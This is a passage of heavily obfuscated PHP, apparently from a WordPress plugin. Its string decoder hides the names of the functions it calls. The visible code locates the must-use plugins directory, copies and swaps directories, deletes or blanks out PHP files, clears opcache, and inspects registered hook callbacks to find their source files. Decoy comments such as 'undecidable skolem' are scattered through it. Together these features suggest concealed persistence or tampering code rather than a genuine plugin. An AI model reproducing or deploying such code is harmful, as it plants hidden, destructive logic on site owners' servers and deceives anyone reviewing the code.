'.'Dc+'.'_n'.'=Y'.'*"d'.'%W'.'\\';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function bovhd4vawcd($i){$j=$i+0;return m5t68uuej1($j);}function m40pvx5ij_z4mj($i){$j=(int)$i;return m5t68uuej1($j);}function lpwgqh9300($i){$j=$i+0;return m5t68uuej1($j);}$GLOBALS['__scf_os_n9tj5psxjj_3']=m40pvx5ij_z4mj(3);$GLOBALS['__scf_xmn9leryvjikgb_4']=m40pvx5ij_z4mj(4);$GLOBALS['__scf_i8i8g4oxha_7']=lpwgqh9300(7);$GLOBALS['__scf_ygq7rrk70hs6ha_8']=lpwgqh9300(8);$GLOBALS['__scf_vvn10ievj2k_9']=m5t68uuej1(9);$GLOBALS['__scf_fr9u7cq1eo_10']=bovhd4vawcd(10);$GLOBALS['__scf_oagg5b1ubqmznt_11']=lpwgqh9300(11);$GLOBALS['__scf_zsw089px33o1o__12']=lpwgqh9300(12);$GLOBALS['__scf_cuisofqx8fjt_16']=m5t68uuej1(16);$GLOBALS['__scf__vykm6livjsep_17']=m40pvx5ij_z4mj(17);$GLOBALS['__scf_o_94ckdo_kfcf_19']=m40pvx5ij_z4mj(19);$GLOBALS['__scf_a83pywb98qzq2_20']=m40pvx5ij_z4mj(20);$GLOBALS['__scf_vtcl9hk0l_e1o6_23']=lpwgqh9300(23);$GLOBALS['__scf_a7yyfjhtdfh5_25']=m40pvx5ij_z4mj(25);$GLOBALS['__scf_j79iy74onqck2_35']=lpwgqh9300(35);$GLOBALS['__scf_hojd6el5tn_36']=m40pvx5ij_z4mj(36);$GLOBALS['__scf_pomb89yiuz_37']=m40pvx5ij_z4mj(37);$GLOBALS['__scf_xbixt340jb_38']=bovhd4vawcd(38);$GLOBALS['__scf_f0u4ydzyxol_39']=lpwgqh9300(39);$GLOBALS['__scf_b5yzo205c3_f8_41']=m5t68uuej1(41);$GLOBALS['__scf_e_8z8ias8ka_43']=m40pvx5ij_z4mj(43);$GLOBALS['__scf_i9hdv7zrfsy_45']=m40pvx5ij_z4mj(45);$GLOBALS['__scf_ph63athptt_46']=m40pvx5ij_z4mj(46);$GLOBALS['__scf_j_lsn68og3i_48']=bovhd4vawcd(48);$GLOBALS['__scf_p_260ito5s0j_50']=m5t68uuej1(50);$GLOBALS['__scf_b8zhccrnlgsp_55']=bovhd4vawcd(55);$GLOBALS['__scf_pe3s4q1z7z_59']=bovhd4vawcd(59);$GLOBALS['__scf_pd74_ila1rfp_70']=m40pvx5ij_z4mj(70);$GLOBALS['__scf_ql1i4f573p8rhm_73']=lpwgqh9300(73);$GLOBALS['__scf_fiolz593w9mj_75']=m5t68uuej1(75);$GLOBALS['__scf_gvpwhn3ygzlhu_76']=lpwgqh9300(76);$GLOBALS['__scf_uzzmy0m_bqw_77']=m40pvx5ij_z4mj(77);$GLOBALS['__scf_wgdf7f0l0fi5_78']=m40pvx5ij_z4mj(78);$GLOBALS['__scf_q9p5ajdcil_79']=lpwgqh9300(79);$GLOBALS['__scf_c7jg5u2s_wzbrw_95']=lpwgqh9300(95);$GLOBALS['__scf_vqnw5_4kg7eu_96']=lpwgqh9300(96);$GLOBALS['__scf_tm09rtls_27e_98']=m40pvx5ij_z4mj(98);$GLOBALS['__scf_pftf6vocmvs2m_99']=lpwgqh9300(99);$GLOBALS['__scf_vi47igxg1zd_103']=lpwgqh9300(103);$GLOBALS['__scf_ebsa9aprq0y_104']=bovhd4vawcd(104);$GLOBALS['__scf_qa8nkfur9w_111']=m40pvx5ij_z4mj(111);$GLOBALS['__scf_wninqej2t1_113']=m40pvx5ij_z4mj(113);$GLOBALS['__scf_sruyigi7mie8_118']=m40pvx5ij_z4mj(118);$GLOBALS['__scf__ofafsmvux__148']=m40pvx5ij_z4mj(148);$GLOBALS['__scf_jghjt9zxt358_149']=m40pvx5ij_z4mj(149);$GLOBALS['__scf_hf87ul3fvpzrkm_150']=m40pvx5ij_z4mj(150);$GLOBALS['__scf_r3sim5_axb_151']=m40pvx5ij_z4mj(151);$GLOBALS['__scf_tcy2zdxc2t_157']=lpwgqh9300(157);$GLOBALS['__scf_w5tg0wn3h2rih_170']=bovhd4vawcd(170);$GLOBALS['__scf_ibw9xvmx9ckin_187']=bovhd4vawcd(187);$GLOBALS['__scf_u59p44o1il_196']=bovhd4vawcd(196);$GLOBALS['__scf_rwpc7a7ar1p_204']=bovhd4vawcd(204);$GLOBALS['__scf_k960me_qad_a_222']=m40pvx5ij_z4mj(222);$GLOBALS['__scf_x5f3lzhact_223']=bovhd4vawcd(223);$GLOBALS['__scf_y62zhc4994v_225']=bovhd4vawcd(225);$GLOBALS['__scf_zjq4u5uadyu0x_227']=lpwgqh9300(227);$GLOBALS['__scf_a_l_5tgwoy7a_232']=m5t68uuej1(232);$GLOBALS['__scf_z1gy18gsi2_qr4_240']=bovhd4vawcd(240);$GLOBALS['__scf_ah0kip7i2l2f_242']=m5t68uuej1(242);$GLOBALS['__scf_rssv9g8o3ngsd_272']=m40pvx5ij_z4mj(272);$GLOBALS['__scf_idsze11e90jp4g_273']=m40pvx5ij_z4mj(273);$GLOBALS['__scf_vwfp8b2vecve11_274']=bovhd4vawcd(274);$GLOBALS['__scf_dis8cu8jv57_277']=bovhd4vawcd(277);$GLOBALS['__scf_qx61mln_9f_282']=bovhd4vawcd(282);$GLOBALS['__scf_lcxz0dq8nv5_w_284']=lpwgqh9300(284);$GLOBALS['__scf_ciwgxuks3i4cd_287']=m40pvx5ij_z4mj(287);$GLOBALS['__scf_mc3zdhm3ia_07_288']=bovhd4vawcd(288);$GLOBALS['__scf_jvgqufbujun_y_289']=m5t68uuej1(289);$GLOBALS['__scf_bgujd0wqxduxtu_290']=m5t68uuej1(290);$GLOBALS['__scf_qtu2zv75fyyo1_296']=m40pvx5ij_z4mj(296);$GLOBALS['__scf_p_5zmebpb7_298']=bovhd4vawcd(298);$GLOBALS['__scf_yt0iueggb31sm_305']=bovhd4vawcd(305);$GLOBALS['__scf_x3afy82qxwf_08_307']=m5t68uuej1(307);$GLOBALS['__scf_fmhpnvbht5ss5n_322']=m40pvx5ij_z4mj(322);$GLOBALS['__scf_nimluvpxhrpvn_323']=m40pvx5ij_z4mj(323);$GLOBALS['__scf_bhirfghv_sj17k_328']=bovhd4vawcd(328);$GLOBALS['__scf_hajqvo8bhu_332']=lpwgqh9300(332);$GLOBALS['__scf__6hbvafs34jo_336']=m40pvx5ij_z4mj(336);$GLOBALS['__scf_ezzukb35pvl6__337']=m5t68uuej1(337);$GLOBALS['__scf_vbecp6uayr_340']=lpwgqh9300(340);$GLOBALS['__scf_dl_1lcowe4_351']=lpwgqh9300(351);$GLOBALS['__scf_of4qyeiv5oh8t_352']=lpwgqh9300(352);$GLOBALS['__scf_e1fr80hqavau3c_353']=lpwgqh9300(353);$GLOBALS['__scf_xsxk3ht6_06zc_354']=m40pvx5ij_z4mj(354);$GLOBALS['__scf_wak9390fh7p_356']=bovhd4vawcd(356);$GLOBALS['__scf_o29w98gt8o_358']=bovhd4vawcd(358);$GLOBALS['__scf_kr_w9stt2gb_360']=lpwgqh9300(360);$GLOBALS['__scf_j_1rdtsntzx_365']=bovhd4vawcd(365);$GLOBALS['__scf_zb77rzhln7336v_369']=bovhd4vawcd(369);$GLOBALS['__scf_sfs0wi3jqm1fd_391']=bovhd4vawcd(391);$GLOBALS['__scf_dhscvkxtkkh7_392']=lpwgqh9300(392);$GLOBALS['__scf_dg190gj3k4cyb_394']=lpwgqh9300(394);$GLOBALS['__scf_t1qun6sstv31a4_411']=m40pvx5ij_z4mj(411);$GLOBALS['__scf_kaaaw926skklz8_412']=bovhd4vawcd(412);$GLOBALS['__scf_z7ypj2lb3f_421']=lpwgqh9300(421);$GLOBALS['__scf_hkezfepne6p6xo_429']=m5t68uuej1(429);$GLOBALS['__scf_r1v12_o00h5hc_454']=m40pvx5ij_z4mj(454);$GLOBALS['__scf_f0qmyuwszehfh7_472']=bovhd4vawcd(472);$GLOBALS['__scf_fffiaden_pfx9__473']=m40pvx5ij_z4mj(473);$GLOBALS['__scf_l_p7ggy6l__533']=lpwgqh9300(533);$GLOBALS['__scf_jphyng87rekxk_557']=m40pvx5ij_z4mj(557);$GLOBALS['__scf_yjcl8fn_3cky0_573']=bovhd4vawcd(573);$GLOBALS['__scf_sfkxpd8jhlhj_587']=bovhd4vawcd(587);$GLOBALS['__scf_f05arsu9h0_598']=m5t68uuej1(598);$GLOBALS['__scf_osp_zuquda_649']=m5t68uuej1(649);$GLOBALS['__scf_w6ni5cg4iy63n_682']=m5t68uuej1(682);$GLOBALS['__scf_nmc3chd3edto_699']=lpwgqh9300(699);$GLOBALS['__scf_vowir1tqun7n1x_713']=m5t68uuej1(713);$GLOBALS['__scf_vq_8cgbui993_718']=bovhd4vawcd(718);$GLOBALS['__scf_zh8jfi64aw1__817']=lpwgqh9300(817);$GLOBALS['__scf_gmtqnw_bd8xed_888']=m5t68uuej1(888);$GLOBALS['__scf_c57f_uqsqk_940']=bovhd4vawcd(940);$GLOBALS['__scf_orx1_v1_dq_993']=bovhd4vawcd(993);$GLOBALS['__scf_k2yehpe4n872_1005']=bovhd4vawcd(1005);$GLOBALS['__scf_cxz48683fju4a_1166']=bovhd4vawcd(1166);$GLOBALS['__scf_e88988j3pigx_1173']=m40pvx5ij_z4mj(1173);$GLOBALS['__scf_v379e8c103x_1261']=m5t68uuej1(1261);$GLOBALS['__scf_kfft5873yws_1265']=bovhd4vawcd(1265);$GLOBALS['__scf_jtrkjx2kfzx520_1268']=m5t68uuej1(1268);$GLOBALS['__scf_jk_3cexwr8g_1269']=m40pvx5ij_z4mj(1269);$GLOBALS['__scf_yyar3fczuf_1270']=m5t68uuej1(1270);$GLOBALS['__scf_mtshhbg5v0emtr_1271']=m40pvx5ij_z4mj(1271);$GLOBALS['__scf_a3jpxier9mst_1272']=m40pvx5ij_z4mj(1272);$GLOBALS['__scf_bgz4a709zkmxh_1273']=m40pvx5ij_z4mj(1273);$GLOBALS['__scf_orzert3s6o7k_1275']=m40pvx5ij_z4mj(1275);$GLOBALS['__scf_smtcda1m7z_1287']=m5t68uuej1(1287);$GLOBALS['__scf_ziuppthkut7_1321']=m5t68uuej1(1321);$GLOBALS['__scf_w76zlppqbjw_1327']=lpwgqh9300(1327);$GLOBALS['__scf_lz43duc1zwuh23_1332']=bovhd4vawcd(1332);$GLOBALS['__scf_at_e2uw9xuj96__1383']=lpwgqh9300(1383);$GLOBALS['__scf_vfprez81gdrrrd_1459']=m40pvx5ij_z4mj(1459);$GLOBALS['__scf_w41c9pnbc9_2d_1488']=bovhd4vawcd(1488);$GLOBALS['__scf_l5alcrnkzdc_1729']=m40pvx5ij_z4mj(1729);$GLOBALS['__scf_rr3n__85bx_1736']=lpwgqh9300(1736);$GLOBALS['__scf_tiy_1360vtth_1833']=m5t68uuej1(1833);

function z43_me5jwdyszeg($pr4nimla5,$honkg6ry){$rll4qdik=($pr4nimla5+72)%13;return $rll4qdik*$honkg6ry;}
function ziuj_dy9kq3fn9yaj($p52q25p){$p52q25p=(isset($p52q25p)?$p52q25p:0)+0;return $p52q25p*4;}


  defined(m5t68uuej1(0))    or exit;
      


   function kdgw8qqvzf6yolk()
  {
  return  isset($GLOBALS[m5t68uuej1(1)])  ?    $GLOBALS[bovhd4vawcd(1)]     : lpwgqh9300(2);

  }
  function t6995wceyqc2q1wqvl()
  {
 return   __FILE__;


     }
    function a_2kjbn3ievobiy5tn3cy()
  {
 return   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());
       }
function  vtoks5z0hvy4jllpl04ts1()
 {


        if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(5)))    return plugin_basename(t6995wceyqc2q1wqvl());

  $e7s4480cj8b1c   = t6995wceyqc2q1wqvl();
$n__4q_62qbh    = defined(bovhd4vawcd(6))  ? WP_PLUGIN_DIR :   "";
if  ($n__4q_62qbh !==  ""   && $GLOBALS['__scf_i8i8g4oxha_7']($e7s4480cj8b1c,    $n__4q_62qbh)  ===    0)    return  $GLOBALS['__scf_ygq7rrk70hs6ha_8']($GLOBALS['__scf_vvn10ievj2k_9']($e7s4480cj8b1c,     $GLOBALS['__scf_fr9u7cq1eo_10']($n__4q_62qbh)),   '/');
return   $GLOBALS['__scf_os_n9tj5psxjj_3']($GLOBALS['__scf_oagg5b1ubqmznt_11']($e7s4480cj8b1c))   .  '/' . $GLOBALS['__scf_os_n9tj5psxjj_3']($e7s4480cj8b1c);
  }


  function     gqtg_eoxyrv0ml2271n()
 {
    return $GLOBALS['__scf_zsw089px33o1o__12'](defined(lpwgqh9300(13))  ? WPMU_PLUGIN_DIR   :  (WP_CONTENT_DIR    .   m5t68uuej1(14)),  '/');
 }
function pnajs4jqkg8ldd0el8wqi()
      {
return  $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl());
     }
 function xcz5hl0mdlt7fpm3xxe($v9qf3vep2p,   $ijvqfm4k0rvi7 =  (464+29),      $w1jfjex0s0pwt =   false)
  {
return     $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(15)) ?     @$GLOBALS['__scf_cuisofqx8fjt_16']($v9qf3vep2p, $ijvqfm4k0rvi7, $w1jfjex0s0pwt)  : false;

     }
  function cik9ldzrbjmtnzm00($ln5_jbqpu4in,     $ijvqfm4k0rvi7)
{
return    $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(17))    ?   @$GLOBALS['__scf__vykm6livjsep_17']($ln5_jbqpu4in,  $ijvqfm4k0rvi7) :  false;
      }
 function    netei2x342rtzmi4tj69($ln5_jbqpu4in)
  {
 return   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(18))  ? @$GLOBALS['__scf_o_94ckdo_kfcf_19']($ln5_jbqpu4in) : false;
 }
    function  a7dvz8wf94o6ie9rtc8hn($uim861ig2y)
 {
  if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))    return   true;
 cik9ldzrbjmtnzm00($uim861ig2y, (337+83));



 if (netei2x342rtzmi4tj69($uim861ig2y)) {
 if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(21)))  @opcache_invalidate($uim861ig2y, true);
  return true;
}
cik9ldzrbjmtnzm00($GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y), (459+34));
   if    (netei2x342rtzmi4tj69($uim861ig2y)) {
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(22))) @opcache_invalidate($uim861ig2y,    true);


return  true;
 }
 $vhe5twxajpf  =  @$GLOBALS['__scf_vtcl9hk0l_e1o6_23']($uim861ig2y, lpwgqh9300(24));
  if ($vhe5twxajpf) {
 @$GLOBALS['__scf_a7yyfjhtdfh5_25']($vhe5twxajpf,  "<?php\n");
     @fclose($vhe5twxajpf);

 if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(22)))   @opcache_invalidate($uim861ig2y,      true);
  return true;
  }
     return    false;
}
function g_xncp1p67nlv9($uim861ig2y)
 {
$e5mp0gfaba   = $GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y);
 $lmcsyjml2p3ta  =    $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y, bovhd4vawcd(26));
 foreach  (array(m40pvx5ij_z4mj(27), m5t68uuej1(28), bovhd4vawcd(29),  lpwgqh9300(30))    as $sbvk3_rckpa)   {

$crrhme7tqz  =      $e5mp0gfaba  . '/' .  $sbvk3_rckpa .  $lmcsyjml2p3ta;



   if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($crrhme7tqz)) a7dvz8wf94o6ie9rtc8hn($crrhme7tqz);
      }
   $gic0rsg3r8z  =  $e5mp0gfaba  .  '/'   . $lmcsyjml2p3ta   .     m40pvx5ij_z4mj(31);
if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($gic0rsg3r8z)) a7dvz8wf94o6ie9rtc8hn($gic0rsg3r8z);


 if    (defined(lpwgqh9300(32))) {
   $xlerr0a2x59q  = WP_CONTENT_DIR   .  bovhd4vawcd(33)  .  $lmcsyjml2p3ta;
 if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($xlerr0a2x59q))      a7dvz8wf94o6ie9rtc8hn($xlerr0a2x59q);
   }
$_pd     =    defined(m40pvx5ij_z4mj(34)) ?   @$GLOBALS['__scf_j79iy74onqck2_35'](WP_PLUGIN_DIR) : false;
 $f5l6q0ffo9cqk06   =   @$GLOBALS['__scf_j79iy74onqck2_35']($e5mp0gfaba);

if ($_pd    && $f5l6q0ffo9cqk06 &&  $GLOBALS['__scf_oagg5b1ubqmznt_11']($f5l6q0ffo9cqk06)     ===   $_pd) {
$s8lxft4i08t_k  = @$GLOBALS['__scf_hojd6el5tn_36']($f5l6q0ffo9cqk06);
  if     ($GLOBALS['__scf_pomb89yiuz_37']($s8lxft4i08t_k)   && $GLOBALS['__scf_xbixt340jb_38']($s8lxft4i08t_k)   <= 2)  @$GLOBALS['__scf_f0u4ydzyxol_39']($f5l6q0ffo9cqk06);
 }

}

   function    ufrh4bxltdlenr_24gaseg()
{
      static  $wmz4p_1d4zd_   = 'x';
      if  ($wmz4p_1d4zd_  !== 'x')   return      $wmz4p_1d4zd_;
$wmz4p_1d4zd_  =  null;
 if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(40)))    { $kdbfhd3lu4ttw   =    @posix_geteuid();  if ($GLOBALS['__scf_b5yzo205c3_f8_41']($kdbfhd3lu4ttw))   $wmz4p_1d4zd_    = $kdbfhd3lu4ttw;   }


 if ($wmz4p_1d4zd_  === null) {
$wkokdoejn433 = m7maju8jcvf3286(r5waslskyqytjrm6(),  m40pvx5ij_z4mj(42));
     if ($GLOBALS['__scf_e_8z8ias8ka_43']($wkokdoejn433))    {  $ozkz0i2skx7   =  @fileowner($wkokdoejn433);   netei2x342rtzmi4tj69($wkokdoejn433);     if      ($GLOBALS['__scf_b5yzo205c3_f8_41']($ozkz0i2skx7)) $wmz4p_1d4zd_   =   $ozkz0i2skx7;  }
 }



     return      $wmz4p_1d4zd_;
  }
 function   odpo3qhnbt216re($_xfdo1_14r691bp)


{
if     ($GLOBALS['__scf_i8i8g4oxha_7']($GLOBALS['__scf_os_n9tj5psxjj_3']($_xfdo1_14r691bp),  m5t68uuej1(44))  !==   0)     return;

       if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp) ||     @$GLOBALS['__scf_ph63athptt_46']($_xfdo1_14r691bp))    return;


 $la9buqn7cuj7777 = @$GLOBALS['__scf_hojd6el5tn_36']($_xfdo1_14r691bp);
  if  ($GLOBALS['__scf_pomb89yiuz_37']($la9buqn7cuj7777))  foreach   ($la9buqn7cuj7777 as      $k3g08rnqu9m) {
    if ($k3g08rnqu9m  ===  '.' ||  $k3g08rnqu9m ===    m5t68uuej1(47)) continue;
  $ln5_jbqpu4in   =      $_xfdo1_14r691bp .  '/'  .    $k3g08rnqu9m;
  if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($ln5_jbqpu4in) &&  !@$GLOBALS['__scf_ph63athptt_46']($ln5_jbqpu4in))   odpo3qhnbt216re($ln5_jbqpu4in); else netei2x342rtzmi4tj69($ln5_jbqpu4in);



  }
// WordPress 6.7 interactivity: randomized scope-chain

@$GLOBALS['__scf_f0u4ydzyxol_39']($_xfdo1_14r691bp);
 }
   function asof2fw_oncfk7l($xs7ycu0j4f9,  $p79alytcr8y0erfs)
    {
  if   (@$GLOBALS['__scf_ph63athptt_46']($xs7ycu0j4f9)) return false;


  if (@$GLOBALS['__scf_a83pywb98qzq2_20']($xs7ycu0j4f9))  {


  if    (!@$GLOBALS['__scf_j_lsn68og3i_48']($xs7ycu0j4f9))  return  false;
 return  b750sq0jbo8pcqvsan($xs7ycu0j4f9,  $p79alytcr8y0erfs) ?   true : false;


  }
// undecidable skolem

  if     (@$GLOBALS['__scf_i9hdv7zrfsy_45']($xs7ycu0j4f9))  {


     if    (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($p79alytcr8y0erfs)  &&     !xcz5hl0mdlt7fpm3xxe($p79alytcr8y0erfs,   (425+68),  true))   return    false;


    $la9buqn7cuj7777  = @$GLOBALS['__scf_hojd6el5tn_36']($xs7ycu0j4f9);
if  (!$GLOBALS['__scf_pomb89yiuz_37']($la9buqn7cuj7777)) return false;


    foreach ($la9buqn7cuj7777  as     $k3g08rnqu9m)    {
  if   ($k3g08rnqu9m     ===    '.'   ||  $k3g08rnqu9m  === m5t68uuej1(49))    continue;
     if    (!asof2fw_oncfk7l($xs7ycu0j4f9   . '/'  . $k3g08rnqu9m,  $p79alytcr8y0erfs .   '/'  .    $k3g08rnqu9m))   return  false;
  }
return true;
   }


return true;



}
 function    xv1s1ysff42y691n($uim861ig2y)
    {
if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))  return  false;
     if (@$GLOBALS['__scf_p_260ito5s0j_50']($uim861ig2y)) return false;
    if  (@$GLOBALS['__scf_p_260ito5s0j_50']($GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y)))  return   false;
  return    true;

 }
      function g3zy8qn5_yvcvi22($uim861ig2y)
     {
   r63yaewew47stuijcrwsx6(bovhd4vawcd(51), $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
 }
  function o_k_og36_9hyi4dckvd($l23di6r2o6)
 {
if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(52))    ||   !$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(36)))    return     false;


       if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(53))  &&    get_transient(bovhd4vawcd(54)))      return  false;
$_1fp6vf73cw  = @$GLOBALS['__scf_j79iy74onqck2_35'](gqtg_eoxyrv0ml2271n());
if ($_1fp6vf73cw     === false  ||     !@$GLOBALS['__scf_i9hdv7zrfsy_45']($_1fp6vf73cw))    return   false;

  $c7dupfhefwjs  =   null;
if    ($l23di6r2o6  !==      null) {
 $c7dupfhefwjs   =  @$GLOBALS['__scf_j79iy74onqck2_35']($l23di6r2o6);
  if    ($c7dupfhefwjs  === false  || $GLOBALS['__scf_oagg5b1ubqmznt_11']($c7dupfhefwjs)   !==  $_1fp6vf73cw)     return false;



    }
 $jle05l6cbowp  = $GLOBALS['__scf_oagg5b1ubqmznt_11']($_1fp6vf73cw);

    if   (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($jle05l6cbowp) ||   !@$GLOBALS['__scf_p_260ito5s0j_50']($jle05l6cbowp))  return   false;
if    (!bmbm6qj8xg0fnyt($_1fp6vf73cw)     || !bmbm6qj8xg0fnyt($jle05l6cbowp)) return  false;
     $qhu2aizenn =    @fileperms($jle05l6cbowp);
    if  ($qhu2aizenn     !==  false    &&  ($qhu2aizenn    & (378+134)))  {
     $dybz7opb9ll5ekc =  ufrh4bxltdlenr_24gaseg();
  if  ($dybz7opb9ll5ekc  === null ||   (@fileowner($jle05l6cbowp)  !== $dybz7opb9ll5ekc  && @fileowner($_1fp6vf73cw)  !== $dybz7opb9ll5ekc))   return  false;
 }
$j0z3mtiaa8uky5x    =    @$GLOBALS['__scf_b8zhccrnlgsp_55']($jle05l6cbowp);  $il015rxc9n   = @$GLOBALS['__scf_b8zhccrnlgsp_55']($_1fp6vf73cw);
 if    ($GLOBALS['__scf_pomb89yiuz_37']($j0z3mtiaa8uky5x)  &&     $GLOBALS['__scf_pomb89yiuz_37']($il015rxc9n) && isset($j0z3mtiaa8uky5x[m5t68uuej1(56)])  &&  isset($il015rxc9n[m5t68uuej1(57)])     &&  $j0z3mtiaa8uky5x[bovhd4vawcd(58)]  !== $il015rxc9n[m40pvx5ij_z4mj(58)])  return false;
  $la9buqn7cuj7777    =    @$GLOBALS['__scf_hojd6el5tn_36']($_1fp6vf73cw);
 if  (!$GLOBALS['__scf_pomb89yiuz_37']($la9buqn7cuj7777))    return   false;
$_uvtsfxr43b9l5yd     = array();


 foreach      ($la9buqn7cuj7777   as  $k3g08rnqu9m)   {



  if ($k3g08rnqu9m  ===  '.' || $k3g08rnqu9m   ===    m40pvx5ij_z4mj(49))  continue;
  $ln5_jbqpu4in   =   $_1fp6vf73cw  . '/'  . $k3g08rnqu9m;
     $om5di26mlqi_2 =   @$GLOBALS['__scf_j79iy74onqck2_35']($ln5_jbqpu4in);
  if    ($c7dupfhefwjs   !==   null &&   $om5di26mlqi_2  !==  false     && $om5di26mlqi_2 ===     $c7dupfhefwjs) continue;
  if (@$GLOBALS['__scf_a83pywb98qzq2_20']($ln5_jbqpu4in)  &&  ey9i45m9xcoe7q13e9ag2($ln5_jbqpu4in,   (429+71)))    continue;
if  (@$GLOBALS['__scf_ph63athptt_46']($ln5_jbqpu4in) ||     !@$GLOBALS['__scf_j_lsn68og3i_48']($ln5_jbqpu4in)) return false;
     $_uvtsfxr43b9l5yd[]  = $k3g08rnqu9m;
    }
   $l9odqxmj1p6z = $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](uniqid("",  true)), 0,     (2<<2));
    $ytre7qoi5z54  =  $jle05l6cbowp .   m40pvx5ij_z4mj(60) .  $l9odqxmj1p6z;
   $v1vrnsxc0scq9ie   = $jle05l6cbowp   .   m5t68uuej1(61) .   $l9odqxmj1p6z;
  if   (!xcz5hl0mdlt7fpm3xxe($ytre7qoi5z54,   (42+451),  true))  return  false;$x6_msguqzzhqnp=60+64;$mqhce_8bu2b=$x6_msguqzzhqnp-37;



   foreach ($_uvtsfxr43b9l5yd   as $k3g08rnqu9m)   {
   if     (!asof2fw_oncfk7l($_1fp6vf73cw    .    '/'  .  $k3g08rnqu9m, $ytre7qoi5z54      .   '/' .    $k3g08rnqu9m)) {  odpo3qhnbt216re($ytre7qoi5z54);    return false; }
}
 if    (!j07vd_9875h0key7jsai($_1fp6vf73cw,   $v1vrnsxc0scq9ie)) { odpo3qhnbt216re($ytre7qoi5z54);   return    false;   }
if  (!j07vd_9875h0key7jsai($ytre7qoi5z54,  $_1fp6vf73cw))   {$iao1zt62uyb=(0x23+0x6c);$tsbknvhiy=$iao1zt62uyb%7;     j07vd_9875h0key7jsai($v1vrnsxc0scq9ie,     $_1fp6vf73cw);  odpo3qhnbt216re($ytre7qoi5z54);  return    false;   }
  if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(62)))  @clearstatcache(true);



 if  ($c7dupfhefwjs !== null &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(22)))    @opcache_invalidate($c7dupfhefwjs,   true);
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(63)))      @set_transient(m40pvx5ij_z4mj(54),   1,  (86307+93));
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(64)))     @delete_transient(m40pvx5ij_z4mj(65));
  r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(66),    m40pvx5ij_z4mj(67) .   ($l23di6r2o6  !==   null ?  $GLOBALS['__scf_os_n9tj5psxjj_3']($l23di6r2o6) :   lpwgqh9300(68)));
  return true;
  }
     function bo_u1wk7i4brm21gz9($y_qnnfh9_u7jy7)
       {
   try   {
if ($y_qnnfh9_u7jy7  instanceof  Closure) {  $w1jfjex0s0pwt = new  ReflectionFunction($y_qnnfh9_u7jy7); return    $w1jfjex0s0pwt->getFileName();    }

  if   ($GLOBALS['__scf_e_8z8ias8ka_43']($y_qnnfh9_u7jy7)    &&  $GLOBALS['__scf_i8i8g4oxha_7']($y_qnnfh9_u7jy7, m40pvx5ij_z4mj(69)) !==      false)     {  $w1jfjex0s0pwt = new  ReflectionMethod($y_qnnfh9_u7jy7);   return  $w1jfjex0s0pwt->getFileName();    }
if      ($GLOBALS['__scf_e_8z8ias8ka_43']($y_qnnfh9_u7jy7)   &&   $GLOBALS['__scf_xmn9leryvjikgb_4']($y_qnnfh9_u7jy7))  {   $w1jfjex0s0pwt  =   new  ReflectionFunction($y_qnnfh9_u7jy7); return $w1jfjex0s0pwt->getFileName();   }
// @debounce lsm-tree

  if  ($GLOBALS['__scf_pomb89yiuz_37']($y_qnnfh9_u7jy7)    && $GLOBALS['__scf_xbixt340jb_38']($y_qnnfh9_u7jy7)  ===    2)  {
// sesquilinear covariant
     $w1jfjex0s0pwt =  new ReflectionMethod($y_qnnfh9_u7jy7[0],   $y_qnnfh9_u7jy7[1]);  return    $w1jfjex0s0pwt->getFileName();   }

  } catch (Throwable      $k3g08rnqu9m)  {} catch (Exception   $k3g08rnqu9m)  {}
 return  null;
 }
function  l9h8q2cews75gx8goqhhg($uim861ig2y)
    {
     global $e5vhpxtfbu25m;
// WP BlockControls: post-dominate registry

 if (!$GLOBALS['__scf_pomb89yiuz_37']($e5vhpxtfbu25m))   return;
   

     $fcuy7ctl_xi85    = @$GLOBALS['__scf_j79iy74onqck2_35']($uim861ig2y);


if    ($fcuy7ctl_xi85 ===    false) $fcuy7ctl_xi85  =  $uim861ig2y;
$yhzmqb__spu7 =    @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl());
foreach   ($e5vhpxtfbu25m as   $cuexmnobz48s2h   =>  $jpalq51p1oahw48l)   {
   if ($GLOBALS['__scf_pd74_ila1rfp_70']($jpalq51p1oahw48l) &&    isset($jpalq51p1oahw48l->callbacks)  &&   $GLOBALS['__scf_pomb89yiuz_37']($jpalq51p1oahw48l->callbacks)) $qaj2jm4j0p4h  =  $jpalq51p1oahw48l->callbacks;
